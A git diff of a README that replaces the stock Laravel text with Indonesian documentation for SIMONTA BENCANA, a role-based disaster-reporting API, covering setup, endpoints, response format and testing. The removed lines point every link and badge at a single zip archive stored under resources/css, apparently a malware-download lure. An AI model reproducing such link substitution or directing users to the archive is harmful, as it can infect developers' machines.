@@ -1,59 +1,224 @@
-<p align="center"><a href="https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip" target="_blank"><img src="https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip%20SVG/2%20CMYK/1%20Full%https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip" width="400" alt="Laravel Logo"></a></p>
+# SIMONTA BENCANA Backend API
 
-<p align="center">
-<a href="https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip"><img src="https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip" alt="Build Status"></a>
-<a href="https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip"><img src="https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip" alt="Total Downloads"></a>
-<a href="https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip"><img src="https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip" alt="Latest Stable Version"></a>
-<a href="https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip"><img src="https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip" alt="License"></a>
-</p>
+Backend API untuk sistem pelaporan dan penanganan bencana berbasis role (Admin, PetugasBPBD, OperatorDesa, Warga), dibangun dengan Laravel 12 dan autentikasi JWT.
 
-## About Laravel
+## Fitur Utama
 
-Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:
+- Autentikasi JWT: login, register, refresh token, logout, profil user.
+- Role-based access control: pembatasan akses endpoint berdasarkan role.
+- Manajemen laporan bencana: CRUD laporan, statistik, dan workflow verifikasi/proses.
+- Modul operasional: monitoring, tindak lanjut, riwayat tindakan.
+- Master data wilayah: provinsi, kabupaten, kecamatan, desa (listing + CRUD admin).
+- Integrasi BMKG: gempa terbaru/terkini/dirasakan, peringatan tsunami, prakiraan cuaca.
+- API documentation: OpenAPI/Swagger (`l5-swagger`).
+- Kontrak response API konsisten (`success`, `message`, `data`, `code`, `request_id`).
 
-- [Simple, fast routing engine](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip).
-- [Powerful dependency injection container](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip).
-- Multiple back-ends for [session](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip) and [cache](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip) storage.
-- Expressive, intuitive [database ORM](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip).
-- Database agnostic [schema migrations](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip).
-- [Robust background job processing](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip).
-- [Real-time event broadcasting](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip).
+## Tech Stack
 
-Laravel is accessible, powerful, and provides tools required for large, robust applications.
+- PHP `^8.2`
+- Laravel `^12.0`
+- JWT Auth: `tymon/jwt-auth`
+- Swagger: `darkaonline/l5-swagger`
+- FCM: `edwinhoksberg/php-fcm`
+- Database: MySQL/SQLite (konfigurasi via `.env`)
 
-## Learning Laravel
+## Struktur Modul API
 
-Laravel has the most extensive and thorough [documentation](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework. You can also check out [Laravel Learn](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip), where you will be guided through building a modern Laravel application.
+Berikut grup endpoint utama dari `routes/api.php`:
 
-If you don't feel like reading, [Laracasts](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip) can help. Laracasts contains thousands of video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
+- `auth/*`: login, register, me, refresh, logout, roles.
+- `users/*`: profil user + manajemen user (admin).
+- `laporans/*`: CRUD laporan, statistik, workflow (`verifikasi`, `proses`, `riwayat`).
+- `monitoring/*`: CRUD monitoring operasional.
+- `tindak-lanjut/*`: CRUD tindak lanjut.
+- `riwayat-tindakan/*`: CRUD riwayat tindakan.
+- `kategori-bencana/*`: referensi kategori bencana (CRUD admin).
+- `wilayah/*`: listing/hierarchy/reference + CRUD admin.
+- `bmkg/*`: endpoint data BMKG (public + protected cache management).
 
-## Laravel Sponsors
+## Prasyarat
 
-We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the [Laravel Partners program](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip).
+- PHP 8.2+
+- Composer 2+
+- MySQL 8+ (disarankan untuk environment dev utama)
+- Node.js 18+ dan npm (jika jalankan Vite/build frontend assets)
 
-### Premium Partners
+## Instalasi
 
-- **[Vehikl](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip)**
-- **[Tighten Co.](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip)**
-- **[Kirschbaum Development Group](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip)**
-- **[64 Robots](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip)**
-- **[Curotec](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip)**
-- **[DevSquad](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip)**
-- **[Redberry](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip)**
-- **[Active Logic](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip)**
+1) Clone repository dan install dependency:
 
-## Contributing
+```bash
+composer install
+```
 
-Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip).
+2) Buat file environment:
 
-## Code of Conduct
+```bash
+cp .env.example .env
+```
 
-In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip).
+3) Generate app key:
 
-## Security Vulnerabilities
+```bash
+php artisan key:generate
+```
 
-If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip). All security vulnerabilities will be promptly addressed.
+4) Atur koneksi database di `.env`, lalu migrate:
 
-## License
+```bash
+php artisan migrate
+```
 
-The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/Khairul122/backend-simontana/main/resources/css/backend-simontana-2.3-beta.5.zip).
+5) (Opsional) install JS dependencies:
+
+```bash
+npm install
+```
+
+## Menjalankan Aplikasi
+
+### Mode standar
+
+```bash
+php artisan serve
+```
+
+API default akan tersedia di:
+
+- `http://127.0.0.1:8000/api`
+
+### Mode development terintegrasi (composer script)
+
+Menjalankan server + queue + logs + vite sekaligus:
+
+```bash
+composer run dev
+```
+
+## Dokumentasi API (Swagger)
+
+Generate docs:
+
+```bash
+php artisan l5-swagger:generate
+```
+
+Akses docs:
+
+- `http://127.0.0.1:8000/api/documentation`
+
+## Auth dan Security
+
+- Public auth endpoint:
+  - `POST /api/auth/login`
+  - `POST /api/auth/register`
+- Kedua endpoint auth publik sudah menggunakan throttle limiter.
+- Endpoint protected menggunakan middleware JWT (`jwt.auth`).
+- Authorization berbasis role dan policy per-record pada modul operasional.
+
+## Kontrak Response API
+
+### Sukses
+
+```json
+{
+  "success": true,
+  "message": "OK",
+  "data": {},
+  "request_id": "req_xxx"
+}
+```
+
+### Gagal
+
+```json
+{
+  "success": false,
+  "message": "Error",
+  "code": "ERROR_CODE",
+  "details": {},
+  "request_id": "req_xxx"
+}
+```
+
+## Testing
+
+Menjalankan seluruh test:
+
+```bash
+php artisan test
+```
+
+Menjalankan test tertentu:
+
+```bash
+php artisan test --filter=SecurityWorkflowPerformanceTest
+```
+
+Catatan:
+
+- Konfigurasi test ada di `phpunit.xml`.
+- Environment test saat ini diset ke MySQL (`simonta_bencana_test`). Pastikan DB test tersedia.
+
+## Optimasi Performa (Development)
+
+Build cache framework:
+
+```bash
+php artisan optimize
+php artisan route:cache
+php artisan config:cache
+php artisan view:cache
+```
+
+Membersihkan cache saat debugging:
+
+```bash
+php artisan optimize:clear
+```
+
+## Benchmark Endpoint
+
+Project menyediakan script benchmark endpoint:
+
+- Script: `scripts/benchmark_endpoints.php`
+- Output CSV: `storage/logs/api-benchmark-latency.csv`
+
+Jalankan benchmark:
+
+```bash
+php scripts/benchmark_endpoints.php
+```
+
+## Panduan Fetch Endpoint
+
+Dokumentasi curl endpoint dipisah per role:
+
+- `FETCH.md` (index)
+- `FETCH_PUBLIC.md`
+- `FETCH_WARGA.md`
+- `FETCH_OPERATOR_DESA.md`
+- `FETCH_PETUGAS_BPBD.md`
+- `FETCH_ADMIN.md`
+
+## Kontribusi
+
+Alur kontribusi yang disarankan:
+
+1. Buat branch fitur/perbaikan.
+2. Implementasi perubahan + test.
+3. Jalankan lint/test lokal.
+4. Buat commit yang jelas dan kecil.
+5. Ajukan PR.
+
+## Troubleshooting Singkat
+
+- `401 TOKEN_MISSING`: pastikan header `Authorization: Bearer <token>` dikirim.
+- `401 TOKEN_INVALID/TOKEN_EXPIRED`: login ulang atau refresh token.
+- `403 INSUFFICIENT_PERMISSIONS`: role user tidak sesuai endpoint.
+- `422 VALIDATION_ERROR`: cek field request sesuai validasi endpoint.
+- Swagger kosong/tidak update: jalankan `php artisan l5-swagger:generate`.
+
+## Lisensi
+
+Project ini mengikuti lisensi yang tercantum pada `composer.json` (MIT untuk skeleton Laravel).
